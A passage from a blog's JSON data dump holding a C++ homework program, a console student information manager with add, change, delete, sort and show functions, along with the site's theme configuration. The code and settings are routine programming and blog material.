class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>.setf(<span class=\"built_in\">std</span>::ios::left);</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; Boy[Maxn].Num &lt;&lt; <span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; setw(<span class=\"number\">8</span>) &lt;&lt; Boy[Maxn].Name;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t &quot;</span> &lt;&lt; Boy[Maxn].Sex &lt;&lt; <span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(<span class=\"number\">2</span>) &lt;&lt; Boy[Maxn].Score &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tSTU S;</span><br><span class=\"line\">\tS.TITLE_STU();</span><br><span class=\"line\">\tS.READ_STU();</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> choice;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"built_in\">cin</span> &gt;&gt; choice)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (choice == <span class=\"number\">1</span>)S.ADD_STU();</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (choice == <span class=\"number\">2</span>)S.CHANGE_STU();</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (choice == <span class=\"number\">3</span>)S.DEL_STU();</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (choice == <span class=\"number\">4</span>)S.SHOW_STU();</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (choice == <span class=\"number\">5</span>)S.SORT_STU();</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (choice == <span class=\"number\">6</span>)S.MAX_STU();</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (choice == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tS.WRITE_STU();</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tsystem(<span class=\"string\">&quot;PAUSE&amp;CLS&quot;</span>);</span><br><span class=\"line\">\t\tS.TITLE_STU();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":10657,"excerpt":"<blockquote>\n<p>C++课程作业</p>\n</blockquote>","more":"<p><strong>非文件操作:</strong><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iomanip&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> ll;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> K=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">STU</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    ll Num;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> Name[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"keyword\">char</span> Sex;</span><br><span class=\"line\">    <span class=\"keyword\">double</span> Score;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> flag;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">TITLE_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ADD_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">CHANGE_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">DEL_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">SHOW_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">SORT_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">MAX_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">friend</span> <span class=\"keyword\">bool</span> <span class=\"title\">CMP</span><span class=\"params\">(STU,STU)</span></span>;</span><br><span class=\"line\">    STU()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ~STU()&#123;&#125;</span><br><span class=\"line\">&#125;Boy[<span class=\"number\">1000</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">CMP</span><span class=\"params\">(STU a,STU b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (a.Score == b.Score)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> a.Num&lt;b.Num;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> a.Score&gt;b.Score;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::TITLE_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t1:\\tADD A STUDENT&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t2:\\tCHANGE STUDENTS\\&#x27;S INFORMATION&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t3:\\tDELETE A STUDENT&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t4:\\tSHOW STUDENTS INFORMATION&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t5:\\tSORT BY SCORE&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t6:\\tSHOW THE MAX SCORE\\&#x27; STUDENT&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t0:\\tEXIT THE STUDENTS INFORMATION MANAGE SYSTEM&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"string\">&quot;\\tPLEASE ENTER SELECTED CHOICES FROM ABOVE LISTS&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::ADD_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;请输入要添加的学生人数&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> T;<span class=\"built_in\">cin</span>&gt;&gt;T;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;请输入&quot;</span>&lt;&lt;T&lt;&lt;<span class=\"string\">&quot;行学生的学号,姓名,性别,成绩&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;T;i++,K++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">cin</span>&gt;&gt;Boy[K].Num&gt;&gt;Boy[K].Name&gt;&gt;Boy[K].Sex&gt;&gt;Boy[K].Score;</span><br><span class=\"line\">        Boy[K].flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"string\">&quot;学生信息导入成功&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::CHANGE_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;请输入要修改的学生学号,输入0停止删除&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    ll num;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">cin</span>&gt;&gt;num)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;K;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(num==Boy[i].Num)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;请再次输入学生的学号,姓名,性别,成绩&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">                <span class=\"built_in\">cin</span>&gt;&gt;Boy[i].Num&gt;&gt;Boy[i].Name&gt;&gt;Boy[i].Sex&gt;&gt;Boy[i].Score;</span><br><span class=\"line\">                Boy[i].flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">                flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;学生信息修改成功&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(num==<span class=\"number\">0</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(flag==<span class=\"number\">0</span>)<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;NO SUCH STUDENTS&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::DEL_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;请输入要删除的学生学号,输入0停止删除&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    ll num;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">cin</span>&gt;&gt;num)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;K;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(num==Boy[i].Num)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                Boy[i].flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">                flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;DELETE SUCCESS!&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(num==<span class=\"number\">0</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(flag==<span class=\"number\">0</span>)<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;NO SUCH STUDENTS&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::SHOW_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"string\">&quot;\\tThe Lists Of Students Are Here&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;    学号\\t姓名\\t\\t性别\\t成绩&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>.setf(<span class=\"built_in\">std</span>::ios::left);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;K;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(Boy[i].flag==<span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;Boy[i].Num&lt;&lt;<span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;setw(<span class=\"number\">8</span>)&lt;&lt;Boy[i].Name;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t &quot;</span>&lt;&lt;Boy[i].Sex&lt;&lt;<span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;setiosflags(ios::fixed)&lt;&lt;setprecision(<span class=\"number\">2</span>)&lt;&lt;Boy[i].Score&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span 